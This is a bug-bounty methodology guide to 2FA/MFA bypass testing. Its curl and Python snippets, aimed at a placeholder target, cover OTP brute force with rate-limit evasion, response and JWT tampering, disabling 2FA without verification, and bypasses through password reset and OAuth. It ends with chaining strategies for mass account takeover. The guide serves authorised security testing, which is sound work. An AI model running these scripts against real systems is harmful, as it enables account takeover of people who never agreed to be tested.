# 2FA / MFA Bypass — Deep Testing Methodology

## Overview
Two-Factor Authentication bypass is a **P1/Critical to P2/High** vulnerability class. When 2FA/MFA can be bypassed, it directly enables account takeover — one of the highest-impact findings in bug bounties.

## Why This Matters
- 2FA is the last line of defense against credential stuffing/phishing
- A bypass renders all authentication security meaningless
- Bug bounty payouts: $3,000–$25,000+ depending on impact
- Frequently found even in mature applications

## Detection Methodology

### Step 1: Understand the 2FA Flow
```bash
# Map the complete authentication flow
# Step 1: Login request
curl -v -X POST "https://TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"testpass"}' \
  -c cookies.txt 2>&1 | grep -E "Set-Cookie|Location|token|session|2fa|mfa|otp|verify"

# Step 2: Check what happens after login — does it redirect to 2FA?
curl -v -b cookies.txt "https://TARGET/api/verify-2fa" 2>&1
curl -v -b cookies.txt "https://TARGET/account/security/2fa" 2>&1

# Step 3: Check if 2FA endpoint reveals info
curl -v -b cookies.txt "https://TARGET/api/2fa/status" 2>&1
```

### Step 2: Direct Access Bypass (Skip 2FA Page)
```bash
# After entering credentials, try accessing protected pages directly
# instead of completing 2FA verification
curl -b cookies.txt "https://TARGET/dashboard"
curl -b cookies.txt "https://TARGET/api/me"
curl -b cookies.txt "https://TARGET/api/user/profile"
curl -b cookies.txt "https://TARGET/account/settings"

# Check if the session token from Step 1 already has full access
curl -b cookies.txt "https://TARGET/api/admin/users"
```

### Step 3: Response Manipulation
```python
import requests

s = requests.Session()

# Login
s.post("https://TARGET/api/login", json={"username":"user","password":"pass"})

# Submit wrong OTP but intercept response
resp = s.post("https://TARGET/api/verify-2fa", json={"code":"000000"})
print(f"Wrong OTP response: {resp.status_code} {resp.text}")

# Key attacks:
# 1. Change response status code 403 → 200
# 2. Change response body {"success": false} → {"success": true}
# 3. Change response body {"verified": false} → {"verified": true}
# 4. Remove error message from response
# 5. Change "status": "failed" → "status": "ok"
```

### Step 4: OTP Brute Force
```python
import requests
import time

s = requests.Session()
s.post("https://TARGET/api/login", json={"username":"user","password":"pass"})

# Test rate limiting on OTP verification
for code in range(100000, 100050):  # Start with small range to test
    otp = str(code).zfill(6)
    resp = s.post("https://TARGET/api/verify-2fa", json={"code": otp})
    
    if resp.status_code == 429:
        print(f"[RATE LIMITED] at attempt {code - 100000}")
        break
    elif "success" in resp.text.lower() or resp.status_code == 200:
        if "true" in resp.text.lower() or "verified" in resp.text.lower():
            print(f"[VULN] Valid OTP found: {otp}")
            break
    
    # Check different rate limit bypass techniques:
    # time.sleep(0.1)  # Slow brute force

# Rate limit bypass techniques:
# 1. Add X-Forwarded-For with rotating IPs
# 2. Use different User-Agent per request  
# 3. Add null bytes in parameter: code=000000%00
# 4. Use array: code[]=000000
# 5. Send OTP in different formats: JSON vs form-encoded vs XML
```

### Step 5: Backup Code Abuse
```bash
# Test if backup codes have weaknesses
# 1. Backup codes reusable (no single-use enforcement)
curl -X POST "https://TARGET/api/verify-2fa" \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"code":"BACKUP_CODE","type":"backup"}'

# 2. Backup codes predictable (short/numeric)
# 3. Backup code generation doesn't invalidate old codes
# 4. Can generate unlimited backup codes

# Test with the backup code type parameter
curl -X POST "https://TARGET/api/verify-2fa" \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"code":"000000","method":"backup"}'
```

### Step 6: Token/Session Manipulation
```python
import requests
import jwt

s = requests.Session()
resp = s.post("https://TARGET/api/login", json={"username":"user","password":"pass"})

# Check cookies for 2FA state
for cookie in s.cookies:
    print(f"Cookie: {cookie.name} = {cookie.value}")
    
    # Try decoding JWT tokens
    try:
        decoded = jwt.decode(cookie.value, options={"verify_signature": False})
        print(f"  Decoded JWT: {decoded}")
        
        # Look for 2FA flags to manipulate
        # "2fa_verified": false → true
        # "mfa_complete": 0 → 1
        # "auth_level": "partial" → "full"
        # "step": 1 → 2
    except:
        pass

# Check response headers for tokens
print(f"Auth header: {resp.headers.get('Authorization', 'none')}")
print(f"X-Token: {resp.headers.get('X-Token', 'none')}")
```

### Step 7: 2FA Disable Without Verification
```bash
# Try disabling 2FA without re-entering OTP/password
curl -X POST "https://TARGET/api/2fa/disable" \
  -b cookies.txt \
  -H "Content-Type: application/json"

curl -X DELETE "https://TARGET/api/2fa" \
  -b cookies.txt

# Try via settings  
curl -X PUT "https://TARGET/api/settings" \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"two_factor_enabled": false}'

# Try via account update
curl -X PATCH "https://TARGET/api/user/profile" \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"mfa_enabled": false}'
```

### Step 8: Password Reset 2FA Bypass
```bash
# Password reset often bypasses 2FA entirely
# After resetting password, check if 2FA is still required
curl -X POST "https://TARGET/api/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# Use the reset link/token
curl -X POST "https://TARGET/api/reset-password" \
  -H "Content-Type: application/json" \
  -d '{"token":"RESET_TOKEN","password":"newpass123"}'

# Login with new password — is 2FA still required?
curl -X POST "https://TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"victim","password":"newpass123"}'
```

### Step 9: OAuth/SSO 2FA Bypass
```bash
# Social login often bypasses 2FA
# Check if logging in via Google/GitHub/SSO skips 2FA
curl -v "https://TARGET/auth/google" 2>&1 | grep Location
curl -v "https://TARGET/auth/github" 2>&1 | grep Location

# If OAuth login gives full access without 2FA → P1
```

### Step 10: TOTP Secret Leakage
```bash
# Check if TOTP setup endpoint leaks the secret
curl -b cookies.txt "https://TARGET/api/2fa/setup" | jq .

# Look for:
# - secret/key in response body
# - QR code URL containing the secret (otpauth://totp/...)
# - Secret visible in page source
# - Secret in API response even after setup is complete

# Check if secret can be re-retrieved
curl -b cookies.txt "https://TARGET/api/2fa/secret"
curl -b cookies.txt "https://TARGET/api/2fa/qr"
```

## Severity Classification
| Finding | Severity | CVSS |
|---------|----------|------|
| Complete 2FA bypass (direct access) | Critical | 9.1 |
| 2FA bypass via response manipulation | Critical | 8.8 |
| OTP brute force (no rate limit) | High | 8.1 |
| 2FA bypass via password reset | High | 7.5 |
| 2FA bypass via OAuth/SSO | High | 7.5 |
| 2FA disable without re-authentication | High | 7.2 |
| Backup code reuse | Medium | 6.5 |
| TOTP secret leakage | Medium | 5.3 |

## Chaining Strategies
1. **Credential Stuffing + 2FA Bypass → Mass Account Takeover**: Leaked creds from breaches + 2FA bypass = full ATO
2. **Phishing + 2FA Bypass → Targeted ATO**: Stolen password via phishing + skip 2FA = instant access
3. **IDOR + 2FA Disable → ATO**: Find IDOR to disable victim's 2FA, then login with stolen creds
4. **Password Reset + 2FA Bypass → Zero-Click ATO**: Reset victim's password + 2FA not re-required = full access
5. **Session Fixation + 2FA Bypass**: Fix session before login → victim authenticates → 2FA bypass gives attacker full access
